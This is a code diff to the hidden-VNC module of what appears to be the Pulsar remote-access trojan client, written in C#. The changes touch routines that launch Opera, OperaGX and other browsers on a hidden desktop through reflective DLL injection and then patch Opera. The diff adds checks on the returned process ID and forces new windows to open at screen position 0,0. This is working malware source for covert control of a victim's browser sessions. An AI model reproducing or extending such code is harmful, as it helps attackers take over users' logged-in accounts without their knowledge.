@@ -28,6 +28,7 @@ namespace Pulsar.Client.Helper.HVNC
         private const uint WAIT_OBJECT_0 = 0x00000000;
         private const uint WAIT_TIMEOUT = 0x00000102;
         private const uint INFINITE = 0xFFFFFFFF;
+        private const int STARTF_USEPOSITION = 0x00000004;
 
         private void CloneDirectory(string sourceDir, string destinationDir)
         {
@@ -193,14 +194,22 @@ namespace Pulsar.Client.Helper.HVNC
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath);
-                    Debug.WriteLine("Opera started successfully with reflective DLL injection.");
-
-                    Thread.Sleep(2000);
-                    Task.Run(async () =>
+                    int processId = KDOTInjector.Start(dllbytes, operaConfig.ExecutablePath, operaConfig.SearchPattern, operaConfig.ReplacementPath);
+                    if (processId > 0)
                     {
-                        await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-                    });
+                        Debug.WriteLine("Opera started successfully with reflective DLL injection.");
+
+                        // Apply Opera patcher asynchronously AFTER process is running
+                        Thread.Sleep(2000);
+                        Task.Run(async () =>
+                        {
+                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                        });
+                    }
+                    else
+                    {
+                        Debug.WriteLine("Failed to start Opera process.");
+                    }
                 }
                 catch (Exception injectionEx)
                 {
@@ -230,15 +239,22 @@ namespace Pulsar.Client.Helper.HVNC
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
-                    Debug.WriteLine("OperaGX started successfully with reflective DLL injection.");
-
-                    // Apply Opera patcher asynchronously after injection
-                    Thread.Sleep(2000);
-                    Task.Run(async () =>
+                    int processId = KDOTInjector.Start(dllbytes, operaGXConfig.ExecutablePath, operaGXConfig.SearchPattern, operaGXConfig.ReplacementPath);
+                    if (processId > 0)
                     {
-                        await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-                    });
+                        Debug.WriteLine("OperaGX started successfully with reflective DLL injection.");
+
+                        // Apply Opera patcher asynchronously AFTER process is running
+                        Thread.Sleep(2000);
+                        Task.Run(async () =>
+                        {
+                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                        });
+                    }
+                    else
+                    {
+                        Debug.WriteLine("Failed to start OperaGX process.");
+                    }
                 }
                 catch (Exception injectionEx)
                 {
@@ -348,6 +364,10 @@ namespace Pulsar.Client.Helper.HVNC
                 STARTUPINFO startupInfo = default(STARTUPINFO);
                 startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                 startupInfo.lpDesktop = this.DesktopName;
+                // Set position to 0,0 to ensure any windows open on main monitor
+                startupInfo.dwX = 0;
+                startupInfo.dwY = 0;
+                startupInfo.dwFlags = STARTF_USEPOSITION;
                 PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
                 if (CreateProcess(null, killCommand, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref startupInfo, ref processInfo))
@@ -365,17 +385,24 @@ namespace Pulsar.Client.Helper.HVNC
 
                 try
                 {
-                    KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath);
-                    Debug.WriteLine($"{browserType} started successfully with reflective DLL injection.");
-
-                    if (browserType.Equals("Opera", StringComparison.OrdinalIgnoreCase) ||
-                          browserType.Equals("OperaGX", StringComparison.OrdinalIgnoreCase))
+                    int processId = KDOTInjector.Start(dllbytes, config.ExecutablePath, config.SearchPattern, config.ReplacementPath);
+                    if (processId > 0)
                     {
-                        Thread.Sleep(2000);
-                        Task.Run(async () =>
+                        Debug.WriteLine($"{browserType} started successfully with reflective DLL injection.");
+
+                        if (browserType.Equals("Opera", StringComparison.OrdinalIgnoreCase) ||
+                              browserType.Equals("OperaGX", StringComparison.OrdinalIgnoreCase))
                         {
-                            await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
-                        });
+                            Thread.Sleep(2000);
+                            Task.Run(async () =>
+                            {
+                                await OperaPatcher.PatchOperaAsync(maxRetries: 5, delayBetweenRetries: 1000);
+                            });
+                        }
+                    }
+                    else
+                    {
+                        Debug.WriteLine($"Failed to start {browserType} process.");
                     }
                 }
                 catch (Exception injectionEx)
@@ -394,6 +421,10 @@ namespace Pulsar.Client.Helper.HVNC
             STARTUPINFO structure = default(STARTUPINFO);
             structure.cb = Marshal.SizeOf<STARTUPINFO>(structure);
             structure.lpDesktop = this.DesktopName;
+            // try setting position to 0,0
+            structure.dwX = 0;
+            structure.dwY = 0;
+            structure.dwFlags = STARTF_USEPOSITION;
             PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
             return CreateProcess(null, filePath, IntPtr.Zero, IntPtr.Zero, false, 48, IntPtr.Zero, null, ref structure, ref process_INFORMATION);
         }
@@ -552,6 +583,10 @@ namespace Pulsar.Client.Helper.HVNC
                 STARTUPINFO startupInfo = default(STARTUPINFO);
                 startupInfo.cb = Marshal.SizeOf<STARTUPINFO>(startupInfo);
                 startupInfo.lpDesktop = this.DesktopName;
+                // Set position to 0,0 to ensure any windows open on main monitor
+                startupInfo.dwX = 0;
+                startupInfo.dwY = 0;
+                startupInfo.dwFlags = STARTF_USEPOSITION;
                 PROCESS_INFORMATION processInfo = default(PROCESS_INFORMATION);
 
                 Debug.WriteLine($"Killing any existing {processName}.exe processes...");
